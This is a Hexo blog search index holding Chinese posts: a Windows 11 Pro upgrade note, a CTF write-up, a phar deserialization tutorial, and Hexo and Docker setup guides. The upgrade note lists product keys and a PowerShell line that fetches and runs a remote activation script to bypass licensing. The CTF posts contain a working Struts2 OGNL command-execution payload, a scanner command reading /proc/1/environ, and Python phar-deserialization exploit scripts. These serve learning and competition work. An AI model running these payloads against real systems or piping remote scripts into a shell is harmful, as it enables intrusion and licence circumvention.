<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>升级为win11专业版</title>
      <link href="/2023/10/29/%E5%8D%87%E7%BA%A7%E4%B8%BAwin11%E4%B8%93%E4%B8%9A%E7%89%88/"/>
      <url>/2023/10/29/%E5%8D%87%E7%BA%A7%E4%B8%BAwin11%E4%B8%93%E4%B8%9A%E7%89%88/</url>
      
        <content type="html"><![CDATA[<p>今天给自己从win11家庭版升级到了win11专业版，简单记录一下，</p><p>先是断网的情况下，从网上找一个密钥，我这里先放两个</p><pre><code>J8WVF-9X3GM-4WVYC-VDHQG-42CXT7Y64F-88DCY-Y6WTC-H33D2-64QHF</code></pre><p>接着慢慢等待更新，更新完毕之后会显示没有激活，这个时候打开powershell,不要用cmd。（需要注意的是这个地方要联网了）输入如下命令</p><pre><code>irm massgrave.dev/get | iex</code></pre><p>无脑选1就行了，别管为啥。然后就可以了。</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界*ctf wp</title>
      <link href="/2023/08/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ctf-wp/"/>
      <url>/2023/08/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ctf-wp/</url>
      
        <content type="html"><![CDATA[<p>总结一下前两天*ctf里面的web题，这道题整体还是比较简单的，大概是用到了jwt伪造+hash长度扩展攻击</p><p>点进题目之后，可以在页面源码找到一个路由，访问之后可以得到</p><pre><code>&lt;?php  highlight_file(__FILE__);  include &quot;./secret_key.php&quot;;  include &quot;./salt.php&quot;;  //$salt = XXXXXXXXXXXXXX // the salt include 14 characters  //md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df  @$username = urldecode($_POST[&quot;username&quot;]);  @$password = urldecode($_POST[&quot;password&quot;]);  if (!empty($_COOKIE[&quot;digest&quot;])) &#123;      if ($username === &quot;admin&quot; &amp;&amp; $password != &quot;root&quot;) &#123;           if ($_COOKIE[&quot;digest&quot;] === md5($salt.$username.$password)) &#123;              die (&quot;The secret_key is &quot;. $secret_key);          &#125;          else &#123;              die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);          &#125;      &#125;      else &#123;          die (&quot;no no no&quot;);      &#125;  &#125;</code></pre><p>这里的salt是在username和password前面，所以这里猜测可以使用hash长度扩展攻击，用到了hashpump这个工具</p><p>我的是在kali里面装的</p><p><img src="https://img-1317758194.cos.ap-nanjing.myqcloud.com/typoraimage-20230801182212590.png" alt="image-20230801182212590"></p><blockquote><p>第一个数据是salt和adminroot拼接之后MD5加密得到的值，第二数据是adminroot后半部分的root，是因为上面的判断要求username &#x3D;&#x3D;&#x3D; “admin”，接着是salt和admin的长度和，然后随便添加一个值习惯字符数大于4（没验证过小于四会不会影响复现），然后就会分别得到digest和password的值，注意这里得到的password的值要把\x替换为%</p></blockquote><p>然后就可以得到</p><p><img src="https://img-1317758194.cos.ap-nanjing.myqcloud.com/typoraimage-20230801182634751.png" alt="image-20230801182634751"></p><p>之后就要用到<a href="https://jwt.io/">jwt伪造</a>,填入得到的key即可获得伪造好的cookit.</p><p><img src="https://img-1317758194.cos.ap-nanjing.myqcloud.com/typoraimage-20230801182944043.png" alt="image-20230801182944043"></p><p>然后就会进入一个新的路由，查看页面再结合题目，不难猜测是structs,直接用<a href="https://gitcode.net/mirrors/Vancomycin-g/struts2scan">工具</a>,</p><pre><code>python3 Struts2Scan.py -u http://140.210.223.216:55557/admiiiiiiiiiiin/user.actionpython3 Struts2Scan.py -u http://140.210.223.216:55557/admiiiiiiiiiiin/user.action -n S2-016 --exec&gt;cat /proc/1/environ</code></pre><p><img src="https://img-1317758194.cos.ap-nanjing.myqcloud.com/typoraimage-20230801184135593.png" alt="image-20230801184135593"></p><p><img src="https://img-1317758194.cos.ap-nanjing.myqcloud.com/typoraimage-20230801184153332.png" alt="image-20230801184153332"></p><p>执行任意代码payload：(flag在环境变量里面)</p><pre><code>&#39; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;env&#39;).getInputStream())) + &#39;</code></pre><p>输出出来的环境变量里面有flag。</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>phar反序列化</title>
      <link href="/2023/07/26/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/07/26/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>今天学一下phar反序列化</p><p>利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性，可以拓展php反序列化漏洞的攻击面。该方法在<strong>文件系统函数</strong>（file_exists()、is_dir()等）参数可控的情况下，配合<strong>phar:&#x2F;&#x2F;伪协议</strong>，可以不依赖unserialize()直接进行反序列化操作。</p><h1 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h1><p>在学习攻击手法之前要先了解一下phar的文件结构。</p><h3 id="1-a-stub"><a href="#1-a-stub" class="headerlink" title="1. a stub"></a>1. a stub</h3><p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p><h3 id="2-a-manifest-describing-the-contents"><a href="#2-a-manifest-describing-the-contents" class="headerlink" title="2. a manifest describing the contents"></a>2. a manifest describing the contents</h3><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p><h3 id="3-the-file-contents"><a href="#3-the-file-contents" class="headerlink" title="3.the file contents"></a>3.the file contents</h3><p>被压缩文件的内容</p><h3 id="4-optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only"><a href="#4-optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only" class="headerlink" title="4.[optional] a signature for verifying Phar integrity (phar file format only)"></a>4.[optional] a signature for verifying Phar integrity (phar file format only)</h3><p>​签名，放在文件末尾</p><h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><pre><code>1.phar可以上传到服务器端(存在文件上传)2.要有可用的魔术方法作为“跳板”。3.操作函数的参数可控，且:、/、phar等特殊字符没有被过滤</code></pre><h1 id="demo演示"><a href="#demo演示" class="headerlink" title="demo演示"></a>demo演示</h1><p>生成php.ini中需要phar.readonly&#x3D;off</p><pre><code>&lt;?php/* 文件名 */$phar = new phar(&quot;a.phar&quot;); //文件名$phar-&gt;startBuffering();/* 设置stub，必须要以__HALT_COMPILER(); ?&gt;结尾 */$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);/* 添加要压缩的文件 */$phar-&gt;addFromString(&quot;test1.txt&quot;,&quot;test1&quot;);$phar-&gt;addFromString(&quot;test2.txt&quot;,&quot;test2&quot;);$phar-&gt;stopBuffering();?&gt;</code></pre><p>php中相当一部分的文件系统函数在通过phar:&#x2F;&#x2F;伪协议解析文件时，都会将meta-data进行反序列化，</p><p><img src="https://img-1317758194.cos.ap-nanjing.myqcloud.com/typoraimage-20230724192257320.png" alt="image-20230724192257320"></p><pre><code>&lt;?php     class TestObject &#123;        public function __destruct() &#123;            echo &#39;Destruct called&#39;;        &#125;    &#125;    $filename = &#39;phar://phar.phar/test.txt&#39;;    file_get_contents($filename); ?&gt;</code></pre><blockquote><p><code>$filename = &#39;phar://phar.phar/test.txt&#39;;</code>定义了一个名为<code>$filename</code>的变量，并将其设置为<code>phar://phar.phar/test.txt</code>，即使用Phar协议来指定一个位于Phar文件内的文件<code>test.txt</code>。</p><p><code>file_get_contents($filename);</code>使用<code>file_get_contents</code>函数读取<code>$filename</code>指定的文件内容。由于<code>$filename</code>是使用Phar协议指定的，因此<code>file_get_contents</code>会从<code>phar.phar</code>这个Phar文件中获取<code>test.txt</code>文件的内容。</p></blockquote><h1 id="将phar伪装为其他格式的文件"><a href="#将phar伪装为其他格式的文件" class="headerlink" title="将phar伪装为其他格式的文件"></a>将phar伪装为其他格式的文件</h1><p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p><pre><code>&lt;?php    class TestObject &#123;    &#125;    @unlink(&quot;phar.phar&quot;);    $phar = new Phar(&quot;phar.phar&quot;);    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头    $o = new TestObject();    $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件    //签名自动计算    $phar-&gt;stopBuffering();?&gt;</code></pre><p><img src="https://img-1317758194.cos.ap-nanjing.myqcloud.com/typoraimage-20230724192833395.png" alt="image-20230724192833395"></p><p>这里是将gif伪装为gif，通过这种方法可以绕过相当一部分的上传检测。</p><h1 id="具体利用"><a href="#具体利用" class="headerlink" title="具体利用"></a>具体利用</h1><p>有一说一，虽然看了一些文章来了解phar反序列化的作用原理，但是由于没有具体做题以至于对这个反序列化还是一知半解，甚至连怎么做都不知道，不过后来看了<a href="https://bilala.gitee.io/2022/04/01/prize1/">bilala师傅</a>的wp才知道该如何下手做。</p><p>接下来以nssctf里面的prize_p1为例进行演示。</p><p>源代码</p><pre><code>&lt;META http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;?phphighlight_file(__FILE__);class getflag &#123;    function __destruct() &#123;        echo getenv(&quot;FLAG&quot;);    &#125;&#125;class A &#123;    public $config;    function __destruct() &#123;        if ($this-&gt;config == &#39;w&#39;) &#123;            $data = $_POST[0];            if (preg_match(&#39;/get|flag|post|php|filter|base64|rot13|read|data/i&#39;, $data)) &#123;                die(&quot;我知道你想干吗，我的建议是不要那样做。&quot;);            &#125;            file_put_contents(&quot;./tmp/a.txt&quot;, $data);        &#125; else if ($this-&gt;config == &#39;r&#39;) &#123;            $data = $_POST[0];            if (preg_match(&#39;/get|flag|post|php|filter|base64|rot13|read|data/i&#39;, $data)) &#123;                die(&quot;我知道你想干吗，我的建议是不要那样做。&quot;);            &#125;            echo file_get_contents($data);        &#125;    &#125;&#125;if (preg_match(&#39;/get|flag|post|php|filter|base64|rot13|read|data/i&#39;, $_GET[0])) &#123;    die(&quot;我知道你想干吗，我的建议是不要那样做。&quot;);&#125;unserialize($_GET[0]);throw new Error(&quot;那么就从这里开始起航吧&quot;);</code></pre><blockquote><p>首先是一个<code>getflag</code>类，内容就是输出<code>$FLAG</code> ，触发条件为<code>__destruct</code>；</p><p>__destruct是析构函数，会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</p><p>第二个类是<code>A</code>，作用有两个，一个是写文件（file_put_contents），一个是读文件（file_get_contents），写入数据和读取对象都是<code>POST[0]</code></p></blockquote><p>由于正则匹配对flag有过滤，所以这个不能直接去触发getflag，那么去A类里面找一找，任意文件写入+任意文件读取+类，可以考虑用phar反序列化，</p><h3 id="知识点补充"><a href="#知识点补充" class="headerlink" title="知识点补充"></a>知识点补充</h3><h5 id="通过gc机制触发-destruct"><a href="#通过gc机制触发-destruct" class="headerlink" title="通过gc机制触发__destruct"></a>通过gc机制触发__destruct</h5><p>在PHP中，正常触发析构函数(__destruct)有三种方法：</p><p>①程序正常结束</p><p>②主动调用<code>unset($aa)</code></p><p>③将原先指向类的变量取消对类的引用，即<code>$aa = 其他值;</code></p><p>前两种很好理解，主要来讲讲第三种PHP中的垃圾回收<code>Garbage collection</code>机制，利用引用计数和回收周期自动管理内存对象。当一个对象没有被引用时，PHP就会将其视为“垃圾”，这个”垃圾“会被回收，回收过程中就会触发析构函数，可以通过取消原本对getflag的应用，从而出发对他的析构函数。</p><h5 id="php异常"><a href="#php异常" class="headerlink" title="php异常"></a>php异常</h5><p>PHP中的错误级别：</p><pre><code>致命错误 E_ERROR， 语法错误 E_PARSE， 警告错误 E_WARNING， 通知错误 E_NOTICE</code></pre><blockquote><p>其中前两种会导致程序异常退出（中止），所以程序本该释放内存等这些操作也就无法完成了，也就无法触发析构函数</p><p>而后两种只是抛出异常，但仍会继续执行程序</p></blockquote><h5 id="数组绕过preg-match"><a href="#数组绕过preg-match" class="headerlink" title="数组绕过preg_match"></a>数组绕过preg_match</h5><p>在题中<code>POST[0]</code>传入数组即可绕过关键字检测，就可以直接写入phar文件的内容了，无需对phar文件做额外处理，然后直接获取flag</p><h5 id="phar-支持的后缀"><a href="#phar-支持的后缀" class="headerlink" title="phar:&#x2F;&#x2F;支持的后缀"></a>phar:&#x2F;&#x2F;支持的后缀</h5><p>除了<code>.phar</code>可以用phar:&#x2F;&#x2F;读取，<code>gzip</code> <code>bzip2</code> <code>tar</code> <code>zip</code> 这四个后缀同样也支持phar:&#x2F;&#x2F;读取</p><p><a href="https://guokeya.github.io/post/uxwHLckwx/">guoke</a>师傅的文章</p><p>所以在此题中，可以对<code>phar.phar</code>文件做以上这些处理，使其成为乱码，从而绕过关键字的检测。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>先传入构造的phar文件内容，但是在传入时我们需要先绕过preg_match的检测（数组绕过或者tar，gzip），传入后我们再利用<code>phar://tmp/a.txt</code>读取文件。读取时，会反序列化其中的metadata数据（我们构造的数据），在反序列化<code>a:2:&#123;i:0;O:7:&quot;getflag&quot;:0:&#123;&#125;i:0;N;&#125;</code>时，又会因为类被取消引用从而触发GC，从而触发getflag类的析构函数，从而获取flag</p><h5 id="制作phar文件"><a href="#制作phar文件" class="headerlink" title="制作phar文件"></a>制作phar文件</h5><p>操作如下，在phar的metadata中写入的内容为<code>a:2:&#123;i:0;O:7:&quot;getflag&quot;:0:&#123;&#125;i:0;N;&#125;</code></p><p>这样的话，当phar:&#x2F;&#x2F;反序列化其中的数据时（反序列化时是按顺序执行的），先反出a[0]的数据，也就是a[0]&#x3D;getflag类，再接着反序列化时，又将a[0]设为了NULL，那就和上述所说的一致了，getflag类被取消了引用，所以会触发他的析构函数，从而获得flag</p><h5 id="修改phar文件"><a href="#修改phar文件" class="headerlink" title="修改phar文件"></a>修改phar文件</h5><p>但新的问题又随之产生了，我们在phar中无法生成上述的字符串内容，我们只能生成<code>a:2:&#123;i:0;O:7:&quot;getflag&quot;:0:&#123;&#125;i:1;N;&#125;</code></p><pre><code>&lt;?phpclass getflag&#123;&#125;$a = new getflag();$a = array(0=&gt;$a,1=&gt;null);@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件（随便填）//签名自动计算$phar-&gt;stopBuffering();?&gt;</code></pre><blockquote><p>注意修改配置文件<code>php.ini</code>中的phar的<code>readonly</code>为<code>off</code>并去掉这行前边的分号</p></blockquote><p>用16进制编辑器进行修改，修改为30，这样meta-data就会变为a:2:{i:0;O:7:”getflag”:0:{}i:0;N;}了</p><p><img src="https://img-1317758194.cos.ap-nanjing.myqcloud.com/typoraimage-20230726160113398.png" alt="image-20230726160113398"></p><blockquote><p>注意不要用记事本直接进行修改，用记事本进行修改的话，修改的数字连同后面的对应的签名都会被修改。</p></blockquote><h5 id="修改phar签名"><a href="#修改phar签名" class="headerlink" title="修改phar签名"></a>修改phar签名</h5><p>phar文件时修改完成了，但是这个phar文件并不是完好的，因为数据与后面的签名时对应不上的。这里就需要通过手动进行修改。</p><p>脚本</p><pre><code>from hashlib import sha1with open(&quot;phar.phar&quot;,&#39;rb&#39;) as f:   text=f.read()   main=text[:-28]        #正文部分(除去最后28字节)   end=text[-8:]  #最后八位也是不变的   new_sign=sha1(main).digest()   new_phar=main+new_sign+end   open(&quot;phar.phar&quot;,&#39;wb&#39;).write(new_phar)     #将新生成的内容以二进制方式覆盖写入原来的phar文件</code></pre><h5 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h5><p>完成上述的操作可以获得一个meta-data部分存在可控代码的phar文件，在POST[0]时传入数组即可</p><p>脚本</p><pre><code>import requestsimport reurl=&quot;http://1.14.71.254:28517/&quot;### 写入phar文件with open(&quot;phar.phar&quot;,&#39;rb&#39;) as f:    data1=&#123;&#39;0[]&#39;:f.read()&#125;          #传数组绕过，值就是phar.phar文件的内容    param1 = &#123;0: &#39;O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;w&quot;;&#125;&#39;&#125;    res1 = requests.post(url=url, params=param1,data=data1)### 读phar文件，获取flagparam2=&#123;0:&#39;O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;r&quot;;&#125;&#39;&#125;data2=&#123;0:&quot;phar://tmp/a.txt&quot;&#125;res2=requests.post(url=url,params=param2,data=data2)flag=re.compile(&#39;NSSCTF\&#123;.*?\&#125;&#39;).findall(res2.text)print(flag)</code></pre><h5 id="gzip绕过"><a href="#gzip绕过" class="headerlink" title="gzip绕过"></a>gzip绕过</h5><p>先获得一个meta-data部分存在可控代码的phar文件，接着执行<code>gzip phar.phar</code>对这个文件进行压缩，接着利用数组绕过的脚本上传即可，注意修改文件名</p><p>当然，利用脚本直接完成gzip压缩和后面一系列操作也是可以的。</p><p>脚本</p><pre><code>import requestsimport reimport gzipurl=&quot;http://1.14.71.254:28517/&quot;### 先将phar文件变成gzip文件with open(&quot;phar.phar&quot;,&#39;rb&#39;) as f1:    phar_zip=gzip.open(&quot;gzip.zip&quot;,&#39;wb&#39;)                  #创建了一个gzip文件的对象    phar_zip.writelines(f1)                                #将phar文件的二进制流写入    phar_zip.close()###写入gzip文件with open(&quot;gzip.zip&quot;,&#39;rb&#39;) as f2:    data1=&#123;0:f2.read()&#125;           #利用gzip后全是乱码绕过                   param1 = &#123;0: &#39;O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;w&quot;;&#125;&#39;&#125;    p1 = requests.post(url=url, params=param1,data=data1)### 读gzip.zip文件，获取flagparam2=&#123;0:&#39;O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;r&quot;;&#125;&#39;&#125;data2=&#123;0:&quot;phar://tmp/a.txt&quot;&#125;p2=requests.post(url=url,params=param2,data=data2)flag=re.compile(&#39;NSSCTF\&#123;.*?\&#125;&#39;).findall(p2.text)       print(flag)</code></pre><h5 id="tar绕过"><a href="#tar绕过" class="headerlink" title="tar绕过"></a>tar绕过</h5><p>先新建一个<code>.phar</code>文件夹，在文件夹中新建<code>.metadata</code>文件，内容直接写入<code>a:2:&#123;i:0;O:7:&quot;getflag&quot;:0:&#123;&#125;i:0;N;&#125;</code></p><p>将文件夹拖入Linux中，<code>tar -cf tartest.tar .phar/</code>生成新文件后再对新文件<code>gzip</code>一下得到<code>tartest.tar.gz</code>文件，再POST这个文件的内容，再读取获得flag</p><blockquote><p> <code>.phar</code>在Linux中显示为隐藏文件，所以拖入后可能会看不见，利用<code>ls -al</code>可以看到</p></blockquote><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p><a href="https://paper.seebug.org/680/#21-phar">https://paper.seebug.org/680/#21-phar</a></p><p><a href="https://bilala.gitee.io/2022/04/01/prize1/">https://bilala.gitee.io/2022/04/01/prize1/</a></p><p><a href="https://guokeya.github.io/post/uxwHLckwx/">https://guokeya.github.io/post/uxwHLckwx/</a></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo静态博客的搭建</title>
      <link href="/2023/07/22/hexo%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
      <url>/2023/07/22/hexo%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>首先下载</p><p>git：<a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a></p><p>和node.js：<a href="https://nodejs.org/zh-cn/">https://nodejs.org/zh-cn/</a>   （版本号要小一点，否则会不兼容，应在14以下，我所使用的版本是12.16.2）</p><p>之后将这两个进行安装，一直点下一步就行，不需要额外配置</p><p>安装完成之后，在cmd窗口分别输入</p><pre><code>node -v</code></pre><pre><code>nmp -v</code></pre><pre><code>git --version</code></pre><p>出现相应版本号即可</p><p>接着使用版本号注册github账号，选择免费账户即可，并且通过邮箱验证。之后右键在显示更多选项里面找到&#x3D;&#x3D;git bash here&#x3D;&#x3D;，进行用户名和邮箱的设置</p><pre><code>git config --global user.name &quot;github用户名&quot;</code></pre><pre><code>git config --global user.email &quot;github邮箱&quot;</code></pre><p>然后&#x3D;&#x3D;创建ssh密钥&#x3D;&#x3D;</p><p>输入</p><pre><code>ssh-keygen -t rsa -C &quot;github邮箱&quot;</code></pre><p>然后一直点回车</p><p>之后进入C:\用户\用户名\ .ssh目录\，然后勾选显示隐藏的文件，之后用记事本打开公钥id_rsa.pub文件，复制里面的内容，然后登录github进入setting页面，选择左侧的&#x3D;&#x3D;SSH and GPG keys&#x3D;&#x3D;，点击New SSH key。</p><p>title随便取一个喜欢的名字，之后将复制的公钥粘贴到key中，点击Add SSH key完成添加。</p><p>然后打开git bash here 输入</p><pre><code>ssh -T git@github.com</code></pre><p>出现Are you sure….输入yes回车确认。显示Hi xxx! You’re successfuly…即为连接成功。</p><p>接着&#x3D;&#x3D;创建github pages仓库&#x3D;&#x3D;，在github右上角的加号里面找到New repository.</p><p>在Repository name中输入用户名.github.io (不用管前面的用户名，在输入框内要输入用户名.github.io)</p><p>勾选Initialize this repository with a README</p><p>填好之后点击Create repository 创建，创建之后默认启用https，博客地址为http:&#x2F;&#x2F;用户名.github.io</p><h3 id="本地安装hexo博客程序"><a href="#本地安装hexo博客程序" class="headerlink" title="本地安装hexo博客程序"></a>本地安装hexo博客程序</h3><p>创建一个文件夹来存放hexo的程序文件，打开这个文件夹，右键找到git bash here </p><p>然后输入</p><pre><code>npm install -g hexo-cli</code></pre><p>若是mac用户则需要管理员权限，来运行这条命令</p><pre><code>sudo npm install -g hexo-cli</code></pre><p>安装时间教程，耐心等待即可</p><p>接着进行hexo的初始化和本地预览</p><pre><code>hexo init#初始化</code></pre><pre><code>npm install#安装组件</code></pre><p>完成后依次输入下列的命令，在本地进行预览</p><pre><code>hexo g#生成页面</code></pre><pre><code>hexo s#启动预览</code></pre><p>接着访问&#x3D;&#x3D;<a href="https://localhost:4000==即可">https://localhost:4000==即可</a></p><p>注意若是页面加载不出来，可能是端口被占用了，ctrl+c关闭进程，然后运行</p><pre><code>hexo server -p 5000</code></pre><p>切换端口即可</p><p>接着我们需要将hexo部署到github pages，这样可以是我们能够联网访问。</p><p>首先安装hexo-deployer-git</p><pre><code>npm install hexo-deployer-git --save</code></pre><p>然后修改——config.yml 文件末尾的Deployment部分</p><pre><code>deploy:  type: git  repository: git@github.com:用户名/用户名.github.io.git  branch: main</code></pre><p>修改完成之后，运行hexo d 将网站部署到github pages。这时我们访问</p><pre><code>https://用户名.github.io</code></pre><p>即可看到hexo网站。</p><p>当我们使用的时候，进入git bash here 创建博文</p><pre><code>hexo new &quot;标题&quot;</code></pre><h3 id="文章发布"><a href="#文章发布" class="headerlink" title="文章发布"></a>文章发布</h3><p>接着进入source文件夹就可以发现我们刚刚创建的一个文件。之后我们就可以通过Markdown编辑器在这个文件中撰写文章了。写完博文之后运行命令将文章部署到github pages上完成发布。</p><pre><code>hexo g#生成页面</code></pre><pre><code>hexo s#部署发布</code></pre><p>当想要使用分类和标签的时候先在主题配置文件进行设置</p><p><img src="https://img-1317758194.cos.ap-nanjing.myqcloud.com/typoraimage-20230722201813332.png" alt="image-20230722201813332"></p><p>接着新建一个分类页面</p><pre><code>hexo new page categories</code></pre><p>标签页面同理</p><pre><code>hexo new page tags</code></pre><p>修改index.php</p><p>打开 <code>categories</code> 文件夹下的 <code>index.md</code> ，在最下面一行加一行文字就行了。</p><p><img src="https://img-1317758194.cos.ap-nanjing.myqcloud.com/typoraimage-20230722202009486.png" alt="image-20230722202009486"></p><p>在发布的时候添加文章分类标签的时候应当以如下格式进行修改</p><p><img src="https://img-1317758194.cos.ap-nanjing.myqcloud.com/typoraimage-20230722202114592.png" alt="image-20230722202114592"></p><blockquote><p>需要注意杂谈前面的空格</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker的使用</title>
      <link href="/2023/07/22/docker%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2023/07/22/docker%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>前几天一直在搞docker，中间状况不断，写点东西记录一下。</p><p>首先对于docker我的理解就是一个小的虚拟机。它可以很方便的通过提前准备好的镜像实现快速部署，打包起来也很方便，而且不同的docker容器运行期间也不会相互影响。</p><p>我本来是想通过用docker搭建hexo博客之后挂载到白嫖的阿里云服务器来实现博客的搭建，同时也能系统的学习一下docker的使用，和加深对docker的理解。</p><p>本来我的计划是在ubuntu里面搭建的docker，之后把hexo博客的种种文件塞进docker里面以此来实现博客的搭建，但是经过一两天的努力，我发现在docker里面从无到有一点点搭建很难，总是状况百出。后来选择用dockerfile搭建，并且主阵地也转移到了阿里云服务器，先是使用下面的命令搭建一个hexo镜像，通过dockerfile搭建镜像的好处就是比较快捷而且相对来说不容易出一些错误。</p><h2 id="制作镜像"><a href="#制作镜像" class="headerlink" title="制作镜像"></a>制作镜像</h2><pre><code>mkdir -p /root/data/hexo-debugcd /root/date/hexo-debugvim Dockerfile</code></pre><pre><code>FROM node:14maintainer lc# 构建参数ARG WORK_PATH=&quot;/hexo&quot;# 设置时区RUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime &amp;&amp; echo &#39;Asia/Shanghai&#39; &gt;/etc/timezone# 替换为阿里源并安装必要工具RUN sed -i &#39;s/deb.debian.org/mirrors.aliyun.com/g&#39; /etc/apt/sources.list  \    &amp;&amp; apt update -y \    &amp;&amp; apt-get install -y curl vim telnet# 解决vim中文乱码、ll命令RUN echo &quot;syntax on \nset termencoding=utf-8 \nset encoding=utf8 \nset fileencodings=utf8,ucs-bom,gbk,cp936,gb2312,gb18030&quot; &gt;&gt; ~/.vimrc  \ &amp;&amp; echo &quot;alias ll=&#39;ls $LS_OPTIONS -l&#39;&quot; &gt;&gt; ~/.bashrc# 安装hexoRUN npm install hexo-cli -g#设置工作目录WORKDIR $WORK_PATH# 继承基础镜像ENTRYPOINT [&quot;docker-entrypoint.sh&quot;]CMD [ &quot;node&quot; ]</code></pre><p>制作镜像</p><pre><code>docker build -t hexo-debug:node14 .</code></pre><blockquote><p>需要注意的一个点是那个node14后面的点，一定不能少！！！，这都是我的血泪史！！</p></blockquote><p>查看已经有的镜像</p><pre><code>docker images</code></pre><h2 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h2><pre><code>docker run -dit  -p 4000:4000 --name hexo-debug hexo-debug:node14</code></pre><blockquote><p>这个命令用于在Docker中运行一个基于镜像 “hexo-debug:node14” 的容器，以分离模式(<code>-d</code>)和伪终端(<code>-t</code>)附加方式运行。容器将被命名为 “hexo-debug”，使用 <code>--name</code> 参数指定。它还将通过 <code>-p</code> 参数将主机的 4000 端口映射到容器内部的 4000 端口。</p></blockquote><p>进入容器</p><pre><code>docker ps -a   #查看所有容器详情</code></pre><pre><code>docker ps      #查看正在运行的容器详情</code></pre><p><img src="https://img-1317758194.cos.ap-nanjing.myqcloud.com/typoraimage-20230722175528490.png" alt="image-20230722175528490"></p><pre><code>docker exec -it hexo-debug /bin/bash        #这里可以用hexo-debug也可以用543cfb5f53dd</code></pre><h2 id="初始化hexo"><a href="#初始化hexo" class="headerlink" title="初始化hexo"></a>初始化hexo</h2><p>接着初始化hexo</p><pre><code># 初始化命令，blog为文件夹名hexo init blog# 进入文件夹cd blog# 删除.github文件夹rm -rf .github# 安装npm install# 启动本地服务器hexo s -g </code></pre><p>顺利运行之后，就可以通过访问服务器的公网ip加端口号进行访问了。</p><h2 id="上传拉取镜像"><a href="#上传拉取镜像" class="headerlink" title="上传拉取镜像"></a>上传拉取镜像</h2><p>用docker搭建东西无非就是图一个可以随去随用，那这一点体现在哪里呢，很简单，既然我们可以将镜像启动为容器，那么我们自然可以将我们搭建好环境的容器打包为镜像上传到自己的私有仓库，当自己需要的时候随取随用。</p><p>接着就说一下该怎么将自己的搭建好的容器打包为镜像并且上传</p><p>先使用命令查询一下容器的情况</p><pre><code>docker ps      #docker ps -a也可以</code></pre><p>接着将需要打包的容器停下来</p><pre><code>docker stop hexo-debug     #这里可以用hexo-debug也可以用543cfb5f53dd</code></pre><p>接着进行打包</p><pre><code>docker commit 587d9c2ca2a1 